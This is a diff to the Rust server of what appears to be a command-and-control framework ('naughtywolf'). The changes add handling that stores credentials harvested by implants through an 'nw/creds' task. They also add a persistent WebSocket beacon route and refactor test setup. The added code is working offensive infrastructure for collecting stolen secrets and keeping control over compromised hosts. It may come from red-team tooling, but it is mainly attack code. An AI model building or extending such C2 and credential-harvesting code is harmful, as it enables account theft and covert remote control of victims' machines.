@@ -1,6 +1,11 @@
 use std::sync::Arc;
 
-use axum::{Router, extract::State, routing::post};
+use axum::{
+    Router,
+    extract::State,
+    response::IntoResponse,
+    routing::{get, post},
+};
 use nw_profile::{
     crypto,
     envelope::{Envelope, Kind},
@@ -112,6 +117,40 @@ async fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope
     Ok(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out))
 }
 
+/// Parse a completed `nw/creds` stdout payload into the credential store.
+///
+/// The implant emits a JSON array of `Harvested`. A malformed or empty payload
+/// is ignored rather than failing the poll: a beacon running an older build
+/// (or a non-`creds` reuse of stdout) must not break check-in.
+async fn ingest_creds(state: &ServerState, session_id: &str, stdout: &[u8]) {
+    if stdout.is_empty() {
+        return;
+    }
+    let parsed: Vec<nw_profile::creds::Harvested> = match serde_json::from_slice(stdout) {
+        Ok(items) => items,
+        Err(_) => return,
+    };
+    for item in parsed {
+        let id = crate::creds::CredentialStore::entry_id(
+            session_id,
+            &item.source,
+            &item.cred_type,
+            &item.id,
+        );
+        state
+            .creds
+            .store(crate::creds::Credential {
+                id,
+                source: item.source,
+                cred_type: item.cred_type,
+                session_id: session_id.to_owned(),
+                identifier: item.id,
+                secret: item.secret,
+            })
+            .await;
+    }
+}
+
 async fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
     let Some(sid) = env.session_id else {
         return Err(C2Error::BadRequest);
@@ -128,6 +167,12 @@ async fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2
     // Deliver completed results, then drain pending tasks.
     let result_acks = req.results.iter().map(|result| result.task_id).collect();
     for r in req.results {
+        // A completed `nw/creds` task returns a JSON array of harvested
+        // credentials on stdout; ingest it into the credential store before
+        // the result is handed on.
+        if state.queue.command(&sid, &r.task_id).await.as_deref() == Some("nw/creds") {
+            ingest_creds(state, &sid.to_string(), &r.stdout).await;
+        }
         state.queue.deliver_result(&sid, r).await;
     }
     // Persist any file download chunks and collect resume acks.
@@ -172,6 +217,26 @@ fn to_status(e: C2Error) -> axum::http::StatusCode {
         C2Error::Unauthorized => axum::http::StatusCode::UNAUTHORIZED,
         C2Error::Internal(_) => axum::http::StatusCode::INTERNAL_SERVER_ERROR,
     }
+}
+
+/// Shared test state, used by the channel and gRPC tests. Hoisted to module
+/// scope so every transport test builds identical state.
+#[cfg(test)]
+pub(crate) fn test_state() -> (ServerState, SharedQueue) {
+    use crate::session::SessionRegistry;
+    let reg = Arc::new(SessionRegistry::new());
+    let q = Arc::new(crate::queue::TaskQueue::new());
+    let state = ServerState {
+        registry: reg,
+        queue: q.clone(),
+        psk: Arc::new(b"test-psk".to_vec()),
+        files: crate::filestore::FileStore::new(
+            std::env::temp_dir().join(format!("nw-test-files-{}", std::process::id())),
+        ),
+        uploads: crate::uploadstore::UploadStore::default(),
+        creds: Arc::new(crate::creds::CredentialStore::new_in_memory()),
+    };
+    (state, q)
 }
 
 /// Open a sealed inbound frame, dispatch it, and re-seal the reply. The clear
@@ -220,7 +285,43 @@ async fn checkin_http(
 pub fn application(state: ServerState) -> Router {
     Router::new()
         .route("/c2/checkin", post(checkin_http))
+        .route("/c2/ws", get(checkin_ws))
         .with_state(state)
+}
+
+/// WebSocket check-in. Speaks the same sealed-envelope protocol as
+/// `/c2/checkin`: each binary message is one sealed frame, answered by one
+/// binary reply. The implant opens the socket once and keeps it for every
+/// beacon, so there is no per-poll connection setup.
+async fn checkin_ws(
+    State(state): State<ServerState>,
+    ws: axum::extract::ws::WebSocketUpgrade,
+) -> Result<axum::response::Response, axum::http::StatusCode> {
+    let state = Arc::new(state);
+    Ok(ws
+        .protocols(["naughtywolf-c2"])
+        .on_upgrade(move |mut socket| async move {
+            while let Some(Ok(message)) = socket.recv().await {
+                let axum::extract::ws::Message::Binary(wire) = message else {
+                    // Ignore text/ping/pong frames; the protocol is binary.
+                    continue;
+                };
+                match process_sealed(&state, &wire).await {
+                    Ok(reply) => {
+                        if socket
+                            .send(axum::extract::ws::Message::Binary(reply.into()))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                    // A bad frame does not kill the channel; skip it.
+                    Err(_) => continue,
+                }
+            }
+        })
+        .into_response())
 }
 
 /// Build the C2 HTTP router over the given shared state.
@@ -243,26 +344,9 @@ fn _unused() {}
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::session::SessionRegistry;
     use axum::body::Body;
     use axum::http::{Request, StatusCode};
     use tower::ServiceExt;
-
-    fn test_state() -> (ServerState, SharedQueue) {
-        let reg = Arc::new(SessionRegistry::new());
-        let q = Arc::new(crate::queue::TaskQueue::new());
-        let state = ServerState {
-            registry: reg,
-            queue: q.clone(),
-            psk: Arc::new(b"test-psk".to_vec()),
-            files: crate::filestore::FileStore::new(
-                std::env::temp_dir().join(format!("nw-test-files-{}", std::process::id())),
-            ),
-            uploads: crate::uploadstore::UploadStore::default(),
-            creds: Arc::new(crate::creds::CredentialStore::new_in_memory()),
-        };
-        (state, q)
-    }
 
     #[test]
     fn derive_is_stable() {
